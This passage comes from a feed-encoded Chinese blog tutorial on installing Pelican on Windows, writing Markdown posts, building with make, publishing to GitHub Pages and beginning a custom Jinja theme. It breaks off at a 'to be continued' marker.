&lt;li&gt;Git工具集（当然还要去Github上搞个账号）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可选（主要这里比较折腾）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bootstrap3 (Twitter出品的快速网站搭建框架)&lt;/li&gt;
&lt;li&gt;Disqus (可以选择国内的社会化评论系统，比如多说)&lt;/li&gt;
&lt;li&gt;Google Analytics (可以选择其他网站分析服务商，比如CNZZ)&lt;/li&gt;
&lt;li&gt;MarkdownPad2 (可视化的Markdown写作软件，还有很多可以选择的，甚至是在线的)&lt;/li&gt;
&lt;li&gt;一些基于JQuery的插件&lt;/li&gt;
&lt;li&gt;一堆其他什么的……&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;搭建环境&lt;/h1&gt;
&lt;h2&gt;安装Python&lt;/h2&gt;
&lt;p&gt;在&lt;a href="https://www.python.org/downloads/"&gt;https://www.python.org/downloads/&lt;/a&gt;下载Python并安装，就那么简单。安装完成后把Python的安装路径扔到环境变量Path里。&lt;/p&gt;
&lt;h2&gt;安装pip和setuptool&lt;/h2&gt;
&lt;p&gt;在&lt;a href="https://pip.pypa.io/en/latest/installing.html"&gt;https://pip.pypa.io/en/latest/installing.html&lt;/a&gt;下载get-pip.py。打开cmd，进入get-pip.py所在目录，之后执行&lt;code&gt;python get-pip.py&lt;/code&gt;，pip和setuptool都会安装好。&lt;/p&gt;
&lt;h2&gt;安装Pelican和Markdown&lt;/h2&gt;
&lt;p&gt;装好了pip就方便了，直接执行以下命令。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install pelican
pip install markdown
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后将Python目录下的script目录路径加入环境变量Path中。&lt;/p&gt;
&lt;h2&gt;安装Git工具&lt;/h2&gt;
&lt;p&gt;下载Github for Windows &lt;a href="https://windows.github.com/"&gt;https://windows.github.com/&lt;/a&gt; 并安装即可。
关于Git的命令，推荐一个简单的&lt;a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000"&gt;git教程&lt;/a&gt;。和图形界面相比，git的shell也非常好用。&lt;/p&gt;
&lt;h2&gt;其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;make只需要下载下来就可以了&lt;a href="http://www.equation.com/servlet/equation.cmd?fa=make"&gt;http://www.equation.com/servlet/equation.cmd?fa=make&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;网上可能会推荐把Pelican装在虚拟环境virtalenv中，这点你自己决定。&lt;/li&gt;
&lt;li&gt;可选部分的下载和安装在写到的时候再给出。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;发表Blog的完整流程&lt;/h1&gt;
&lt;p&gt;Pelican创建Blog的步骤可以总结为：创建框架(包括目录结构，主题模板，配置文件)--&amp;gt;(创建主题)--&amp;gt;写文章--&amp;gt;生成html--&amp;gt;(上传Github等)。&lt;/p&gt;
&lt;p&gt;当碰到问题时候记得查阅手册，这部分在手册&lt;a href="http://docs.getpelican.com/"&gt;http://docs.getpelican.com/&lt;/a&gt;的getting started中。&lt;/p&gt;
&lt;h2&gt;创建框架&lt;/h2&gt;
&lt;p&gt;所谓的框架就是一个静态Blog的生成骨架，Pelican只需要一句命令即可（先cd到要生成的目录中）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pelican-quickstart
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运行命令后根据提示设置，会生成默认的配置文件。此时Pelican已经为我们构建了框架，结构如下:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yourproject/
├── content             #写好的Markdown格式的博文
│   └── (pages)         #Markdown格式的静态界面(比如About，同WP的Page)
├── output              #通过Pelican最终生成的html界面
├── develop_server.sh   #Pelican服务器的脚本
├── fabfile.py          #生成和上传等自动化操作
├── Makefile            #make的自动化脚本
├── pelicanconf.py      #主配置文件(测试环境)
└── publishconf.py      #主配置文件的扩展，用于(生产环境)
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;写文章&lt;/h2&gt;
&lt;p&gt;这里其实和Pelican没多大关系了。这里使用&lt;a href="http://wowubuntu.com/markdown/"&gt;Makedown语法&lt;/a&gt;写文章，并保存为.md文件。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;My&lt;/span&gt; &lt;span class="kd"&gt;super&lt;/span&gt; &lt;span class="n"&gt;title&lt;/span&gt;
&lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2010&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;
&lt;span class="n"&gt;Category&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Python&lt;/span&gt;
&lt;span class="n"&gt;Tags&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;pelican&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;publishing&lt;/span&gt;
&lt;span class="n"&gt;Slug&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;my&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="kd"&gt;super&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;
&lt;span class="n"&gt;Author&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Alexis&lt;/span&gt; &lt;span class="n"&gt;Metaireau&lt;/span&gt;
&lt;span class="n"&gt;Summary&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Short&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;feeds&lt;/span&gt;

&lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;my&lt;/span&gt; &lt;span class="kd"&gt;super&lt;/span&gt; &lt;span class="n"&gt;blog&lt;/span&gt; &lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="err"&gt;#正文内容&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面是官方给出的模板，可以看到正文内容前为文章的meta数据，你可以制定文章的标题、日期、类别、标签、路径名、作者、摘要等(这些信息部分会出现在最终生成html的meta数据中，当然这取决于主题文件是否引用这些数据)。这些里面只有Title和Date是必须的(默认配置下，Date要自己指定是不是很BT，法国人的思维真是……)。meta块之后就用Makrdown写文章啦~当然你可以和我上面说的一样搞一个Markdown的可视化编辑器，写起来很愉快。Markdown语法实现不了的直接用html的语法即可。&lt;/p&gt;
&lt;h2&gt;Pelican重要的操作命令&lt;/h2&gt;
&lt;p&gt;目录中的makefile非常重要，通过make调用makefile中的命令即可完成相关操作。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;make html           #创建静态界面
make regenerate     #修改后自动创建静态界面
make serve          #创建服务器
make devserver      #相当于regenerate+serve
make publish        #生成用于发布的html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;手册上还有其他一些命令，请自行发掘。&lt;/p&gt;
&lt;h2&gt;生成与预览&lt;/h2&gt;
&lt;p&gt;文章写好了就用上面的&lt;code&gt;make html&lt;/code&gt;生成文章，你需要反复不停修改和生成的话就用&lt;code&gt;make regenerate&lt;/code&gt;，每次修改会自动生成新的html。之后用&lt;code&gt;make serve&lt;/code&gt;开启服务器，默认&lt;code&gt;http://localhost:8000&lt;/code&gt;可浏览你的Blog。&lt;/p&gt;
&lt;p&gt;当然最后发布的请使用&lt;code&gt;make publish&lt;/code&gt;，该配置更加适合用于正式发布。&lt;/p&gt;
&lt;h2&gt;Github相关操作&lt;/h2&gt;
&lt;p&gt;以上步骤后静态blog已经生成，默认在output文件夹中。下面需要把它上传到github中。所有关于github page的操作都在&lt;a href="http://pages.github.io"&gt;http://pages.github.io&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;先去Github注册账号，比如用户名是username，然后Create New Repository, Repository的名字必须为username.github.io（网上流传的.com的貌似已经无效了，所以看手册是多么的重要）。&lt;/p&gt;
&lt;p&gt;创建好了之后直接点上面的绿色的set up in desktop就会打开桌面端的Git图形化操作界面。之后会让你同步一个本地的目录，这样本地的目录就和远程的关联好了。commit之后sync即可。&lt;/p&gt;
&lt;p&gt;当然也可以用gitshell，命令也很简单。首先进入需要上传的目录，之后执行(具体命令含义可以看相关git教程)：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git init
git remote origin https://github.com/username/username.github.io.git
git pull
git add .
git commit -m &amp;quot;update&amp;quot;
git push origin master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;大概等几分钟之后即可访问username.github.io。至此，一个完整的Pelican+Github生成静态Blog的流程已经完成。&lt;/p&gt;
&lt;h2&gt;一些问题和处理&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对于Python3默认的配置可能会出现问题，需要将develop_server.sh将&lt;code&gt;PY=${PY:-python2}&lt;/code&gt;改为python3，makefile中如果有问题也需要修改。&lt;/li&gt;
&lt;li&gt;可以将pelicanconf.py中的SITEURL改成&lt;code&gt;http://localhost:8000&lt;/code&gt;，将publishconf.py中的SITEURL改为&lt;code&gt;http://username.github.io&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;主题制作&lt;/h1&gt;
&lt;p&gt;到这儿，你应该已经能顺利搭建起一个基于Pelican的Blog并在Github上发布了。下面我们探讨一下Pelican下的个性化主题制作。主题制作的官方文档&lt;a href="http://docs.getpelican.com/en/3.4.0/themes.html"&gt;在此&lt;/a&gt;，请不断查阅与参考。另外，Pelican官方的Github上也有别人制作好的主题，你可以&lt;a href="https://github.com/getpelican/pelican-themes"&gt;点这儿&lt;/a&gt;进去参考或者下载。&lt;/p&gt;
&lt;h2&gt;制作思路及组件&lt;/h2&gt;
&lt;p&gt;Pelican的主题制作基于&lt;a href="http://jinja.pocoo.org/"&gt;Jinjia模板引擎&lt;/a&gt;，看这个名字和Logo就知道是小日本的作品了，如果你曾经用过smarty（N年以前了）或者是类似的模板引擎，基本能秒速上手。利用模板引擎的优势就是视图和数据的分离，整个过程相当于你写的.md文件就是数据，通过Pelican驱动之后按照Jinjia作为模板填充数据，并输出最终html。&lt;/p&gt;
&lt;p&gt;对于主题制作，无非就是前端的一些东西，什么html啊js啊之类的东西，我这边采用bootstrap3加上一堆插件的方法创建html，之后改写成Jinjia模板。&lt;/p&gt;
&lt;p&gt;通过主题制作，基本可以搞明白大部分Pelican配置的含义。另外，由于这块内容本身覆盖知识面很广，这里只能按照Pelican中特有的一些规定展开，周边的前端知识只能说到一些必要的，其他方面还请读者自行补充。&lt;/p&gt;
&lt;h2&gt;主题结构&lt;/h2&gt;
&lt;p&gt;首先创建主题目录，我准备放在yourproject/theme目录下，此时打开&lt;code&gt;pelicanconf.py&lt;/code&gt;，添加如下字段：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;THEME = &amp;quot;theme&amp;quot;             #主题目录
THEME_STATIC_DIR = &amp;#39;theme&amp;#39;  #生成后的主题目录
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;手册上给出如下主题结构，这写文件可以放在yourproject/theme目录下（具体哪儿都可以通过配置文件指定）。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;├── static
│   ├── css
│   └── images
└── templates
    ├── archives.html         // 文章归档
    ├── period_archives.html  // 按照时间排序的归档
    ├── article.html          // 每篇文章
    ├── author.html           // 每个作者
    ├── authors.html          // 所有作者
    ├── categories.html       // 所有分类
    ├── category.html         // 每个分类
    ├── index.html            // 主页
    ├── page.html             // page界面（自定义的界面）
    ├── tag.html              // 每个不同tag的界面
    └── tags.html             // 总tag界面，可以创建tag云
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看到上面的目录构造可以基本明白各个文件的作用了。static中的文件会被完整复制到生成目录中，而templates中的文件则会通过Pelican处理。&lt;/p&gt;
&lt;p&gt;需要特别说明的是，不是所有文件都是必须的，比如我的Blog就我一个人写文章，只有一个作者，所以author和authors我就不用，你可以保留文件，之后把里面内容删除即可。当然你也可以创建文件，采用Jinjia的包含语句包含到其他界面中，这在后面会说明。&lt;/p&gt;
&lt;h2&gt;主题和配置&lt;/h2&gt;
&lt;p&gt;待续……&lt;/p&gt;</content><category term="github"></category><category term="pelican"></category><category term="bootstrap"></category></entry></feed>